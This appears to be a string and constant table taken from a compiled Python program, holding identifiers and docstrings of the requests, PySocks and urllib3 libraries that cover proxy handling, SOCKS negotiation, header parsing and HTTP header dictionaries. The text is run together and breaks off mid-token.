    a__qualname__TnuCaseInsensitiveDict.__init__a__setitem__uCaseInsensitiveDict.__setitem__uCaseInsensitiveDict.__getitem__a__delitem__uCaseInsensitiveDict.__delitem__a__iter__uCaseInsensitiveDict.__iter__a__len__uCaseInsensitiveDict.__len__uCaseInsensitiveDict.lower_itemsa__eq__uCaseInsensitiveDict.__eq__acopyuCaseInsensitiveDict.copya__repr__uCaseInsensitiveDict.__repr__a__orig_bases__TOdictaLookupDictuDictionary lookup object.uLookupDict.__init__uLookupDict.__repr__uLookupDict.__getitem__uLookupDict.geturequests\structures.pyTa.0acasedkeyamappedvalueTa.0alowerkeyakeyvalu<module requests.structures>Ta__class__TaselfakeyTaselfaotherTaselfadataakwargsTaselfanamea__class__TaselfTaselfakeyavalueTaselfakeyadefault.requests.utils7awinreglaOpenKeyaHKEY_CURRENT_USERuSoftware\Microsoft\Windows\CurrentVersion\Internet SettingsaQueryValueExaProxyEnableaProxyOverrideTEOSErrorEValueErrorasplitTw;u<local>w.ahostareplaceTw.u\.Tw*u.*Tw?w.areamatchwIagetproxies_environmentaproxy_bypass_environmentaproxy_bypass_registryuReturn True, if the host should be bypassed.

        Checks proxy settings gathered from the environment, if specified,
        or the registry.
        aitemsuReturns an internal sequence dictionary update.astraencodeTuutf-8a__len__alenafilenoaUnsupportedOperationafstatast_sizewbamodeawarningsawarnuRequests has determined the content-length for this request using the binary size of the file: however, the file has been opened in text mode (i.e. without the 'b' flag in the mode). This may lead to an incorrect content-length. In Requests 3.0, support will be removed for files in text mode.aFileModeWarningwoatellaseekTllatotal_lengthamaxaenvironagetTaNETRCaNETRC_FILESanetrcTaNetrcParseErroranetrcaNetrcParseErroraexpanduseraurlparsed:aasciianetlocaauthenticatorsllTEImportErrorEAttributeErroruReturns the Requests tuple auth for a given url from netrc.u~/uu<genexpr>uget_netrc_auth.<locals>.<genexpr>anameabasestringw<qw>uTries to guess the filename of the given object.utoo many values to unpack (expected 2)aarchivew/amemberazipfileais_zipfileaZipFileanamelistatempfileagettempdirajoinTw/aatomic_opena__enter__a__exit__awriteareadTnnnuReplace nonexistent paths that look like they refer to a member of a zip
    archive with the location of an extracted copy of the target, or else
    just return the provided path unchanged.
    uWrite a file to the disk in an atomic fashionamkstempafilenameTadirafdopenawbaremoveabytesucannot encode objects that are not 2-tuplesaOrderedDictuTake an object and test to see if it can be represented as a
    dictionary. Unless it can not be represented as such, return an
    OrderedDict, e.g.,

    ::

        >>> from_key_val_list([('key', 'val')])
        OrderedDict([('key', 'val')])
        >>> from_key_val_list('string')
        Traceback (most recent call last):
        ...
        ValueError: cannot encode objects that are not 2-tuples
        >>> from_key_val_list({'key': 'val'})
        OrderedDict([('key', 'val')])

    :rtype: OrderedDict
    aMappinguTake an object and test to see if it can be represented as a
    dictionary. If it can be, return a list of tuples, e.g.,

    ::

        >>> to_key_val_list([('key', 'val')])
        [('key', 'val')]
        >>> to_key_val_list({'key': 'val'})
        [('key', 'val')]
        >>> to_key_val_list('string')
        Traceback (most recent call last):
        ...
        ValueError: cannot encode objects that are not 2-tuples

    :rtype: list
    a_parse_list_header:qnn:nlnw"aunquote_header_value:lqnaresultuParse lists as described by RFC 2068 Section 2.

    In particular, parse comma-separated lists where the elements of
    the list may include quoted-strings.  A quoted-string could
    contain a comma.  A non-quoted string could have quotes in the
    middle.  Quotes are removed automatically after parsing.

    It basically works like :func:`parse_set_header` just that items
    may appear multiple times and case sensitivity is preserved.

    The return value is a standard :class:`list`:

    >>> parse_list_header('token, "quoted value"')
    ['token', 'quoted value']

    To create a header from the :class:`list` again, use the
    :func:`dump_header` function.

    :param value: a string with a list header.
    :return: :class:`list`
    :rtype: list
    w=Tw=luParse lists of key, value pairs as described by RFC 2068 Section 2 and
    convert them into a python dict:

    >>> d = parse_dict_header('foo="is a fish", bar="as well"')
    >>> type(d) is dict
    True
    >>> sorted(d.items())
    [('bar', 'as well'), ('foo', 'is a fish')]

    If there is no value for a key it will be `None`:

    >>> parse_dict_header('key_without_value')
    {'key_without_value': None}

    To create a header from the :class:`dict` again, use the
    :func:`dump_header` function.

    :param value: a string with a dict header.
    :return: :class:`dict`
    :rtype: dict
    :nlnu\\Tu\\w\Tu\"w"uUnquotes a header value.  (Reversal of :func:`quote_header_value`).
    This does not use the real unquoting but what browsers are actually
    using for quoting.

    :param value: the header value to unquote.
    :rtype: str
    avalueuReturns a key/value dictionary from a CookieJar.

    :param cj: CookieJar object to extract cookies from.
    :rtype: dict
    acookiejar_from_dictuReturns a CookieJar from a key/value dictionary.

    :param cj: CookieJar to insert cookies into.
    :param cookie_dict: Dict of key/values to insert into CookieJar.
    :rtype: CookieJar
    uIn requests 3.0, get_encodings_from_content will be removed. For more information, please see the discussion on issue #2266. (This warning should only appear once.)aDeprecationWarningacompileTu<meta.*?charset=["\']*(.+?)["\'>]TaflagsTu<meta.*?content=["\']*;?charset=(.+?)["\'>]Tu^<\?xml.*?encoding=["\']*(.+?)["\'>]afindalluReturns encodings from given content string.

    :param content: bytestring to extract encodings from.
    astrip:lnnu"' afindTw=aitems_to_stripaparams_dictaloweruReturns content type and parameters from given header

    :param header: string
    :return: tuple containing content type and dictionary of
         parameters
    Tucontent-typea_parse_content_type_headeracharsetTu'"atextuISO-8859-1uapplication/jsonuutf-8uReturns encodings from given HTTP Header Dict.

    :param headers: dictionary to extract encoding from.
    :rtype: str
    uStream decodes an iterator.wraencodingaiteratoracodecsagetincrementaldecoderTareplaceTaerrorsadecoderadecodeTctTafinalastream_decode_response_unicodeuIterate over slices of a string.aslice_lengthastringaposaiter_slicesuIn requests 3.0, get_unicode_from_response will be removed. For more information, please see the discussion on issue #2266. (This warning should only appear once.)aget_encoding_from_headersaheadersacontentDaerrorsareplaceuReturns the requested content back in unicode.

    :param r: Response object to get unicode content from.

    Tried:

    1. charset from content-type
    2. fall back and replace all unicode characters

    :rtype: str
    Tw%aparts:llnaisalnumlaInvalidURLuInvalid percent-escape sequence: 'w'aUNRESERVED_SET:lnnw%uUn-escape any percent-escape sequences in a URI that are unreserved
    characters. This leaves all reserved, illegal and non-ASCII bytes encoded.

    :rtype: str
    aquoteaunquote_unreservedDasafeu!#$%&'()*+,/:;=?@[]~Dasafeu!#$&'()*+,/:;=?@[]~uRe-quote the given URI.

    This function passes the given URI through an unquote/quote cycle to
    ensure that it is fully and consistently quoted.

    :rtype: str
    astructaunpacku=Lasocketainet_atonadotted_netmaskuThis function allows you to check if an IP belongs to a network subnet

    Example: returns True if ip = 192.168.1.1 and net = 192.168.1.0/24
             returns False if ip = 192.168.1.1 and net = 192.168.100.0/24

    :rtype: bool
    gl ainet_ntoaapacku>IuConverts mask from /xx format to xxx.xxx.xxx.xxx

    Example: if mask is 24 function returns 255.255.255.0

    :rtype: str
    u
    :rtype: bool
    acountu
    Very simple check of the cidr format in no_proxy variable.

    :rtype: bool
    uSet the environment variable 'env_name' to 'value'

    Save previous value, yield, and then restore the previous value stored in
    the environment variable 'env_name'.

    If 'value' is None, do nothingaenv_nameaold_valueaset_environaget_proxyushould_bypass_proxies.<locals>.get_proxyTano_proxyahostnameano_proxyTw uTw,ais_ipv4_addressais_valid_cidraaddress_in_networkaparsedaportw:aendswithahost_with_portaproxy_bypassagaierrorabypassu
    Returns whether we should bypass proxies or not.

    :rtype: bool
    aupperushould_bypass_proxies.<locals>.<genexpr>ashould_bypass_proxiesagetproxiesu
    Return a dict of environment proxies.

    :rtype: dict
    aschemeTaallu://uall://aalluSelect a proxy for the url, if applicable.

    :param url: The url being for the request
    :param proxies: A dictionary of schemes or schemes and hosts to proxy URLs
    aurlacopyaget_environ_proxiesasetdefaultuThis method takes proxy information from a request and configuration
    input to resolve a mapping of target proxies. This will consider settings
    such as NO_PROXY to strip proxy configurations.

    :param request: Request or PreparedRequest
    :param proxies: A dictionary of schemes or schemes and hosts to proxy URLs
    :param trust_env: Boolean declaring whether to trust environment configs

    :rtype: dict
    a__version__u
    Return a string representing the default user agent.

    :rtype: str
    aCaseInsensitiveDictuUser-Agentadefault_user_agentuAccept-EncodingaDEFAULT_ACCEPT_ENCODINGaAcceptu*/*aConnectionukeep-aliveu
    :rtype: requests.structures.CaseInsensitiveDict
    u '"u, *<Tw;lTu<> '"areplace_charsalinkalinksuReturn a list of parsed link headers proxies.

    i.e. Link: <http:/.../front.jpeg>; rel=front; type="image/jpeg",<http://.../back.jpeg>; rel=back;type="image/jpeg"

    :rtype: list
    :nlnaBOM_UTF32_LEaBOM_UTF32_BEuutf-32:nlnaBOM_UTF8uutf-8-sigaBOM_UTF16_LEaBOM_UTF16_BEuutf-16a_null:nnla_null2uutf-16-be:lnluutf-16-lela_null3uutf-32-beuutf-32-leu
    :rtype: str
    aparse_urlutoo many values to unpack (expected 7)w@aurlunparseuGiven a URL that may or may not have a scheme, prepend the given scheme.
    Does not replace a present scheme with the one provided as an argument.

    :rtype: str
    aunquoteausernameapasswordTEAttributeErrorETypeErrorTupuGiven a url with authentication components, extract them into a tuple of
    username,password.

    :rtype: (str,str)
    a_validate_header_partuVerifies that header parts don't contain leading whitespace
    reserved characters, or return characters.

    :param header: tuple, in the format (name, value).
    a_HEADER_VALIDATORS_STRa_HEADER_VALIDATORS_BYTEaInvalidHeaderuHeader part (u) from u must be of type str or bytes, not uInvalid leading whitespace, reserved character(s), or return character(s) in header u: utoo many values to unpack (expected 6)arsplitTw@lu
    Given a url remove the fragment and the authentication part.

    :rtype: str
    abodya_body_positionainteger_typesaUnrewindableBodyErrorTuAn error occurred when rewinding request body for redirect.TuUnable to rewind request body for redirect.uMove file pointer back to its recorded starting position
    so it can be read again on redirect.
    u
requests.utils
~~~~~~~~~~~~~~

This module provides utility functions that are used within Requests
that are also useful for external consumption.
a__doc__a__file__a__spec__aoriginahas_locationa__cached__acontextlibaioaosasysacollectionsTaOrderedDictuurllib3.utilTamake_headersaparse_urlamake_headersTacertsacertsTa__version__a_internal_utilsTa_HEADER_VALIDATORS_BYTEa_HEADER_VALIDATORS_STRaHEADER_VALIDATORSato_native_stringaHEADER_VALIDATORSato_native_stringacompatTaMappingabasestringabytesagetproxiesagetproxies_environmentainteger_typesTaparse_http_listaparse_http_listTaproxy_bypassaproxy_bypass_environmentaquoteastraunquoteaurlparseaurlunparseacookiesTacookiejar_from_dictaexceptionsTaFileModeWarningaInvalidHeaderaInvalidURLaUnrewindableBodyErrorastructuresTaCaseInsensitiveDictTu.netrca_netrcawhereaDEFAULT_CA_BUNDLE_PATHDahttpahttpslPlaDEFAULT_PORTSu, u,\s*TtTaaccept_encodinguaccept-encodingadict_to_sequenceasuper_lenTFaget_netrc_authaguess_filenameaextract_zipped_pathsacontextmanagerafrom_key_val_listato_key_val_listaparse_list_headeraparse_dict_headeradict_from_cookiejaraadd_dict_to_cookiejaraget_encodings_from_contentaget_unicode_from_responsePBwSwKwQwUwAwrwzw9wMwYwLwBw5waw8wvwowWwjw.w_wCw~w7wfwGwxwgwNwkw0w4wDwRwpwOwdwywJwXwnwEwHwbw2wFwmw6w1wIwTwZw3w-wqwuwswhwtwiwcwVwewwwlwParequote_uriTnaselect_proxyaresolve_proxiesTupython-requestsadefault_headersaparse_header_linkswaguess_json_utfaprepend_scheme_if_neededaget_auth_from_urlacheck_header_validityaurldefragautharewind_bodyurequests\utils.pyTa.0wfTa.0ahostu<module requests.utils>T
aheaderatokensacontent_typeaparamsaparams_dictaitems_to_stripaparamakeyavalueaindex_of_equalsTaheaderaheader_partaheader_validator_indexavalidatoraheader_kindTacjacookie_dictTaipanetaipaddranetaddrabitsanetmaskanetworkTafilenameatmp_descriptoratmp_nameatmp_handlerTaheaderanameavalueTanameTwdTamaskabitsTapathaarchiveamemberaprefixazip_fileatmpaextracted_pathafile_handlerTavalueTaurlaparsedaauthTaheadersacontent_typeaparamsTacontentacharset_reapragma_reaxml_reTaurlano_proxyTaurlaraise_errorsanetrc_fileanetrc_locationsaNetrcParseErroranetrcanetrc_pathwfalocariasplitstrahosta_netrcalogin_iTakeyTwratried_encodingsaencodingTaobjanameTadataasampleanullcountTastring_ipTastring_networkamaskTastringaslice_lengthaposTavaluearesultaitemanameTavaluealinksareplace_charsavalaurlaparamsalinkaparamakeyTavaluearesultaitemTaurlanew_schemeaparsedaschemeaauthahostaportapathaqueryafragmentanetlocTahostTahostawinregainternetSettingsaproxyEnableaproxyOverrideatestTauriasafe_with_percentasafe_without_percentTarequestaproxiesatrust_envaurlaschemeano_proxyanew_proxiesaenviron_proxiesaproxyTaprepared_requestabody_seekTaurlaproxiesaurlpartsaproxy_keysaproxyaproxy_keyTaenv_nameavalueavalue_changedaold_valueTaurlano_proxyaget_proxyano_proxy_argaparsedaproxy_ipahost_with_portahostabypassTaiteratorwradecoderachunkarvTwoatotal_lengthacurrent_positionafilenoTavalueais_filenameTauriapartswiwhwcTaurlaschemeanetlocapathaparamsaqueryafragment.socks*kawrapsawrapperuset_self_blocking.<locals>.wrapperlagettimeoutasetblockingTtafunctionTFa_is_blockingamsgasocket_erru: {}aencodeasocksocketadefault_proxyuSets a default proxy.

    All further socksocket objects will use the default unless explicitly
    changed. All parameters are as for socket.set_proxy().aproxytypeaproxy_typeaset_default_proxyuReturns the default proxy, set by set_default_proxy.asocketaGeneralProxyErrorTuNo default proxy specifieduAttempts to replace a module's socket library with a SOCKS socket.

    Must set a default proxy using set_default_proxy(...) first. This will
    only work on modules that import socket directly into the namespace;
    most of the Python Standard Library falls into this category.utoo many values to unpack (expected 2)astartswithTw[astripTu[]agetaddrinfoaproxy_addraSOCK_STREAMutoo many values to unpack (expected 5)asocket_optionsasockasetsockoptatimeoutTOintOfloatasettimeoutaset_proxyaproxy_portaproxy_rdnsaproxy_usernameaproxy_passwordasource_addressabindaconnectaremote_hostaremote_portaerroraProxyErroracloseaerrTugai returned empty list.ucreate_connection(dest_pair, *[, timeout], **proxy_args) -> socket object

    Like socket.create_connection(), but connects to proxy
    before returning the socket object.

    dest_pair - 2-tuple of (IP/hostname, port).
    **proxy_args - Same args passed to socksocket.set_proxy() if present.
    timeout - Optional socket timeout value, in seconds.
    source_address - tuple (host, port) for the socket to bind to as its source
    address before connecting (only for compatibility)
    a_orig_socketa__init__a_savedmethodsa_savenamesaselfadelattru<lambda>u_makemethod.<locals>.<lambda>anameaSOCK_DGRAMuSocket type must be stream or datagram, not {!r}a_proxyconnaproxyTnnnnnnaproxy_socknameaproxy_peernamea_timeoutcadataacountafileareadTuConnection closed unexpectedlyuReceive EXACTLY the number of bytes requested from the file object.

        Blocks until the required number of bytes have been received.aget_proxy_peernameTnTZu Sets the proxy to be used.

        proxy_type -  The type of the proxy to be used. Three types
                        are supported: PROXY_TYPE_SOCKS4 (including socks4a),
                        PROXY_TYPE_SOCKS5 and PROXY_TYPE_HTTP
        addr -        The address of the server (IP or DNS).
        port -        The port of the server. Defaults to 1080 for SOCKS
                        servers and 8080 for HTTP proxy servers.
        rdns -        Should DNS queries be performed on the remote side
                       (rather than the local side). The default is True.
                       Note: This has no effect with SOCKS4 servers.
        username -    Username to authenticate with to the server.
                       The default is no authentication.
        password -    Password to authenticate with to the server.
                       Only relevant when username is also provided.utoo many values to unpack (expected 6)atypeaEINVALuSocket already bound to an addressaSOCKS5aEOPNOTSUPPuUDP only supported by SOCKS5 proxy typeagetsocknamew0a_proxy_addra_SOCKS5_requestdTu0.0.0.0luImplements proxy connection for UDP sockets.

        Happens during the bind() phase.asendtoTTulq:nqnaBytesIOawriteTbTda_write_SOCKS5_addressasendagetvalueatellarecvfromarecvlaseeklaSEEK_CURTluReceived UDP packet fragmenta_read_SOCKS5_addressaEAGAINuPacket filtereduReturns the bound IP address and port number at the proxy.agetpeernameu
        Returns the IP and port number of the proxy.
        uReturns the IP address and port number of the destination machine.

        Note: get_proxy_peername returns the proxy.duNegotiates a stream connection through a SOCKS5 server.amakefileTawbTarblTbTbawriteraflusha_readall:llndTuSOCKS5 proxy server sent invalid data:llndaSOCKS5AuthErrorTuNo username/password supplied. Server requested username/password authenticationdTuSOCKS5 authentication faileddTuAll offered SOCKS5 authentication methods were rejectedlaSOCKS5_ERRORSagetuUnknown erroraSOCKS5Erroru{:#04x}: {}u
        Send SOCKS5 request with given command (CMD field) and
        address (DST field). Returns resolved DST address that was used.
        aAF_INETaAF_INET6dainet_ptonahostainet_ntopastructapacku>HaportTaidnaaAF_UNSPECaIPPROTO_TCPaAI_ADDRCONFIGlu
        Return the host and port packed for the SOCKS5 protocol,
        and the resolved address as a tuple object.
        lainet_ntoalaunpackainet_atonbagethostbynameu>BBHlTuSOCKS4 proxy server sent invalid datalZaSOCKS4_ERRORSaSOCKS4Error:lnn:llnuNegotiates a connection through a SOCKS4 server.cCONNECT d:c HTTP/1.1cHost: cProxy-Authorization: basic ab64encodec
asendallareadlineasplitTw lutoo many values to unpack (expected 3)TuHTTP proxy server sent invalid responseTuHTTP/TuProxy server does not appear to be an HTTP proxyaHTTPErrorTuHTTP proxy server did not return a valid HTTP statuslu{}: {}Tlllu
[*] Note: The HTTP proxy server may not be supported by PySocks (must be a CONNECT tunnel proxy)Tc0.0.0.0luNegotiates a connection through an HTTP server.

        NOTE: This currently only supports HTTP CONNECT-style proxies.uPySocks doesn't support IPv6: %su0.0.0.0TOlistOtupleTuInvalid destination-connection (host, port) pairu{}:{}aPRINTABLE_PROXY_TYPESuError connecting to {} proxy {}alogadebugu%s due to: %saProxyConnectionErrora_proxy_negotiatorsuSocket erroru
        Connects to the specified destination through a proxy.
        Uses the same API as socket's connect().
        To select the proxy server, use set_proxy().

        dest_pair - 2-tuple of (IP/hostname, port).
        Dacatch_errorstaerrnou https://docs.python.org/3/library/socket.html#socket.socket.connect_ex
        Like connect(address), but return an error indicator instead of raising an exception for errors returned by the C-level connect() call (other problems, such as "host not found" can still raise exceptions).
        aDEFAULT_PORTSTuInvalid proxy typeu
        Return proxy address to connect to as tuple object
        a__doc__a__file__a__spec__aoriginahas_locationa__cached__abase64Tab64encodeucollections.abcTaCallableaCallableacollectionsTaEOPNOTSUPPaEINVALaEAGAINafunctoolsaloggingaosasysu1.7.1a__version__agetLoggerTasocksaPROXY_TYPE_SOCKS4aSOCKS4aPROXY_TYPE_SOCKS5aPROXY_TYPE_HTTPaHTTPaPROXY_TYPESa_orgsocketaset_self_blockingTEOSErrora__prepare__a__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>asocksa__module__uSocket_err contains original socket.error exception.a__qualname__uProxyError.__init__a__str__uProxyError.__str__a__orig_bases__Dl[l\l]uRequest rejected or faileduRequest rejected because SOCKS server cannot connect to identd on the clientuRequest rejected because the client program and identd report different user-idsDlllllllluGeneral SOCKS server failureuConnection not allowed by rulesetuNetwork unreachableuHost unreachableuConnection refuseduTTL expireduCommand not supported, or protocol erroruAddress type not supportedll?Tnnntnnasetdefaultproxyaget_default_proxyagetdefaultproxyawrap_moduleawrapmoduleTnnnnntnnnacreate_connectiona_BaseSocketuAllows Python 2 delegated methods such as send() to be overridden.u_BaseSocket.__init__alista_makemethodTasendtoasendarecvfromarecvamethodaappendusocksocket([family[, type[, proto]]]) -> socket object

    Open a SOCKS enabled socket. The parameters are the same as
    those of the standard socket init. In order for SOCKS to work,
    you must specify family=AF_INET and proto=0.
    The "type" argument must be either SOCK_STREAM or SOCK_DGRAM.
    usocksocket.__init__usocksocket._readallusocksocket.settimeoutusocksocket.gettimeoutusocksocket.setblockingusocksocket.set_proxyasetproxyusocksocket.setproxyusocksocket.bindusocksocket.sendtoTlusocksocket.sendusocksocket.recvfromusocksocket.recvusocksocket.closeaget_proxy_socknameusocksocket.get_proxy_socknameagetproxysocknameusocksocket.get_proxy_peernameagetproxypeernameaget_peernameusocksocket.get_peernamea_negotiate_SOCKS5usocksocket._negotiate_SOCKS5usocksocket._SOCKS5_requestusocksocket._write_SOCKS5_addressusocksocket._read_SOCKS5_addressa_negotiate_SOCKS4usocksocket._negotiate_SOCKS4a_negotiate_HTTPusocksocket._negotiate_HTTPusocksocket.connectaconnect_exusocksocket.connect_exusocksocket._proxy_addrusocks.pyTaselfaposakwanameTanameu<module socks>Ta__class__Taselfaconnacmdadstaproxy_typeaaddraportardnsausernameapasswordawriterareaderachosen_authaauth_statusaresolvedarespastatusaerrorabnda__class__Taselfamsgasocket_errTaselfafamilyatypeaprotoaargsakwargsamsga__class__TaselfTaselfadest_addradest_portaproxy_typeaaddraportardnsausernameapasswordahttp_headersafobjastatus_lineaprotoastatus_codeastatus_msgaerrorTaselfadest_addradest_portaproxy_typeaaddraportardnsausernameapasswordawriterareaderaremote_resolveaaddr_bytesarespastatusaerrorTaselfadest_addraCONNECTTaselfaproxy_typeaproxy_addraproxy_portardnsausernameapasswordTaselfafileaatypaaddralengthaportTaselfafileacountadatawdTaselfaaddrafileahostaportaproxy_typew_ardnsausernameapasswordafamily_to_byteafamilyaaddr_bytesahost_bytesaaddressesatarget_addrTaselfaposakwaproxy_typeaproxy_addraproxy_portardnsausernameapasswordamsgw_aportadstaproxyaUDP_ASSOCIATEarelayahosta__class__Taselfa__class__Taselfadest_pairacatch_errorsadest_addradest_portaproxy_typeaproxy_addraproxy_portardnsausernameapasswordaerroraproxy_serveraprintable_typeamsganegotiatea__class__Taselfadest_pairweTadest_pairatimeoutasource_addressaproxy_typeaproxy_addraproxy_portaproxy_rdnsaproxy_usernameaproxy_passwordasocket_optionsaremote_hostaremote_portaerrwrafamilyasocket_typeaprotoacanonnameasaasockaoptweTaselfaposakwabytesw_T
aselfabufsizeaflagsabufafragafromhostafromportapeerhostapeerporta__class__Taselfabytesaflagsakwargsa__class__TaselfabytesaargsakwargsaaddressaflagsaheaderaRSVaSTANDALONEasenta__class__Taproxy_typeaaddraportardnsausernameapasswordTaselfaproxy_typeaaddraportardnsausernameapasswordTafunctionawrapperTaselfwvTaargsakwargsTaselfaargsakwargsTaselfatimeoutapeera__class__TamoduleTaargsakwargsaselfa_is_blockingweafunctionTafunctionu.urllib3._base_connectionL8a__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsatypinguutil.connectionTa_TYPE_SOCKET_OPTIONSla_TYPE_SOCKET_OPTIONSluutil.timeoutTa_DEFAULT_TIMEOUTa_TYPE_TIMEOUTa_DEFAULT_TIMEOUTa_TYPE_TIMEOUTuutil.urlTaUrlaUrlaUnionaIOaAnyaIterablea_TYPE_BODYaNamedTuplea__prepare__aProxyConfiga__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>uurllib3._base_connectiona__module__a__qualname__a__annotations__ussl.SSLContext | Noneassl_contextaboolause_forwarding_for_httpsuNone | str | typing.Literal[False]aassert_hostnameustr | Noneaassert_fingerprinta__orig_bases__a_ResponseOptionsastrarequest_methodarequest_urlapreload_contentadecode_contentaenforce_content_lengthuurllib3\_base_connection.pyu<module urllib3._base_connection>Ta__class__u.urllib3._collections!aHTTPHeaderDictaMappingacastTOstrpaIterableaTupleakeysa__getitem__aHasGettableStringKeysa__class__a__init__a_maxsizeadispose_funcaOrderedDicta_containeraRLockalocka__enter__a__exit__apopTnnnapopitemTFTalastutoo many values to unpack (expected 2)avalueuIteration over this class is unlikely to be threadsafe.avaluesaclearaselfa_headersaiteritemsa_has_value_for_headera_copy_fromaextendadecodeTulatin-1aloweru, :lnnasetdefaultaensure_can_construct_http_header_dictaitermergeda__eq__la__iter__uHTTPHeaderDict.__iter__qaappenduAdds a (name, value) pair, doesn't overwrite the value if it already
        exists.

        If this is called with combine=True, instead of adding a new header value
        as a distinct item during iteration, this will instead append the value to
        any existing header value with a comma. If no existing header value exists
        for the key, then the value will simply be added, ignoring the combine parameter.

        >>> headers = HTTPHeaderDict(foo='bar')
        >>> headers.add('Foo', 'baz')
        >>> headers['foo']
        'bar, baz'
        >>> list(headers.items())
        [('foo', 'bar'), ('foo', 'baz')]
        >>> headers.add('foo', 'quz', combine=True)
        >>> list(headers.items())
        [('foo', 'bar, baz, quz')]
        uextend() takes at most 1 positional arguments (uu given)aaddaitemsuGeneric import function for any type of header-like object.
        Adapted version of MutableMapping.update in order to insert items
        with self.add instead of self.__setitem__
        a_Sentinelanot_passeduReturns a list of all the values for the named field. Returns an
        empty list if the key doesn't exist.LuContent-EncodinguContent-LanguageuContent-LocationuContent-TypeuContent-LengthaDigestuLast-Modifiedadiscardu
        Remove content-specific header fields before changing the request
        method to GET or HEAD according to RFC 9110, Section 15.4.
        a__name__w(w)aotheragetlistuIterate over all header lines, including duplicate ones.uHTTPHeaderDict.iteritemsuIterate over all headers, merging duplicate ones together.uHTTPHeaderDict.itermergedaHTTPHeaderDictItemViewacopya__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsatypingacollectionsTaOrderedDictaenumTaEnumaautoaEnumaautoathreadingTaRLockaRecentlyUsedContainera__all__aTypeVarTa_KTa_KTTa_VTa_VTTa_DTa_DTaUnionaValidHTTPHeaderSourcea__prepare__u%s.__prepare__() must return a mapping, not %su<metaclass>uurllib3._collectionsa__module__a__qualname__a__orig_bases__DapotentialareturnaobjectuValidHTTPHeaderSource | NoneaGenericaMutableMappingu
    Provides a thread-safe dict-like container which maintains up to
    ``maxsize`` keys while throwing away the least-recently-used keys beyond
    ``maxsize``.

    :param maxsize:
        Maximum number of recent elements to retain.

    :param dispose_func:
        Every time an item is evicted from the container,
        ``dispose_func(value)`` is called.  Callback which will get called
    a__annotations__utyping.OrderedDict[_KT, _VT]aintutyping.Callable[[_VT], None] | NoneTl
nDamaxsizeadispose_funcareturnaintutyping.Callable[[_VT], None] | NoneaNoneuRecentlyUsedContainer.__init__Dakeyareturna_KTa_VTuRecentlyUsedContainer.__getitem__Dakeyavalueareturna_KTa_VTaNonea__setitem__uRecentlyUsedContainer.__setitem__Dakeyareturna_KTaNonea__delitem__uRecentlyUsedContainer.__delitem__Dareturnainta__len__uRecentlyUsedContainer.__len__Dareturnutyping.NoReturnuRecentlyUsedContainer.__iter__DareturnaNoneuRecentlyUsedContainer.clearDareturnuset[_KT]uRecentlyUsedContainer.keysaSetu
    HTTPHeaderDict is unusual for a Mapping[str, str] in that it has two modes of
    address.

    If we directly try to get an item with a particular name, we will get a string
    back that is the concatenated version of all the values:

    >>> d['X-Header-Name']
    'Value1, Value2, Value3'

    However, if we iterate over an HTTPHeaderDict's items, we will optionally combine
    these values based on whether combine=True was called when building up the dictionary

    >>> d = HTTPHeaderDict({"A": "1", "B": "foo"})
    >>> d.add("A", "2", combine=True)
    >>> d.add("B", "bar")
    >>> list(d.items())
    [
        ('A', '1, 2'),
        ('B', 'foo'),
        ('B', 'bar'),
    ]

    This class conforms to the interface required by the MutableMapping ABC while
    also giving us the nonstandard iteration behavior we want; items with duplicate
    keys, ordered by time of first insertion.
    DaheadersareturnaHTTPHeaderDictaNoneuHTTPHeaderDictItemView.__init__uHTTPHeaderDictItemView.__len__Dareturnutyping.Iterator[tuple[str, str]]uHTTPHeaderDictItemView.__iter__Daitemareturnaobjectaboola__contains__uHTTPHeaderDictItemView.__contains__u
    :param headers:
        An iterable of field-value pairs. Must not contain multiple field names
        when compared case-insensitively.

    :param kwargs:
        Additional field-value pairs to pass in to ``dict.update``.

    A ``dict`` like container for storing HTTP Headers.

    Field names are stored and compared case-insensitively in compliance with
    RFC 7230. Iteration provides the first case-sensitive key seen for each
    case-insensitive pair.

    Using ``__setitem__`` syntax overwrites fields that compare equal
    case-insensitively in order to maintain ``dict``'s api. For fields that
    compare equal, instead create a new ``HTTPHeaderDict`` and use ``.add``
    in a loop.

    If multiple fields that are equal case-insensitively are passed to the
    constructor or ``.update``, the behavior is undefined and some will be
    lost.

    >>> headers = HTTPHeaderDict()
    >>> headers.add('Set-Cookie', 'foo=bar')
    >>> headers.add('set-cookie', 'baz=quxx')
    >>> headers['content-length'] = '7'
    >>> headers['SET-cookie']
    'foo=bar, baz=quxx'
    >>> headers['Content-Length']
    '7'
    utyping.MutableMapping[str, list[str]]TnDaheadersakwargsuValidHTTPHeaderSource | NoneastruHTTPHeaderDict.__init__DakeyavalareturnastrpaNoneuHTTPHeaderDict.__setitem__DakeyareturnastrpuHTTPHeaderDict.__getitem__DakeyareturnastraNoneuHTTPHeaderDict.__delitem__DakeyareturnaobjectabooluHTTPHeaderDict.__contains__TuDakeyadefaultareturnastrppuHTTPHeaderDict.setdefaultDaotherareturnaobjectabooluHTTPHeaderDict.__eq__a__ne__uHTTPHeaderDict.__ne__uHTTPHeaderDict.__len__Dareturnutyping.Iterator[str]uHTTPHeaderDict.discardDacombineFDakeyavalacombineareturnastrpaboolaNoneuHTTPHeaderDict.addDaargsakwargsareturnaValidHTTPHeaderSourceastraNoneuHTTPHeaderDict.extendaoverloadDakeyareturnastrulist[str]uHTTPHeaderDict.getlistDakeyadefaultareturnastra_DTulist[str] | _DTDakeyadefaultareturnastru_Sentinel | _DTulist[str] | _DTDareturnaSelfa_prepare_for_method_changeuHTTPHeaderDict._prepare_for_method_changeagetheadersagetallmatchingheadersaigetaget_allDareturnastra__repr__uHTTPHeaderDict.__repr__DaotherareturnaHTTPHeaderDictaNoneuHTTPHeaderDict._copy_fromuHTTPHeaderDict.copyDareturnaHTTPHeaderDictItemViewuHTTPHeaderDict.itemsDaheader_nameapotential_valueareturnastrpabooluHTTPHeaderDict._has_value_for_headerDaotherareturnaobjectaHTTPHeaderDicta__ior__uHTTPHeaderDict.__ior__DaotherareturnaobjectaSelfa__or__uHTTPHeaderDict.__or__a__ror__uHTTPHeaderDict.__ror__uurllib3\_collections.pyu<module 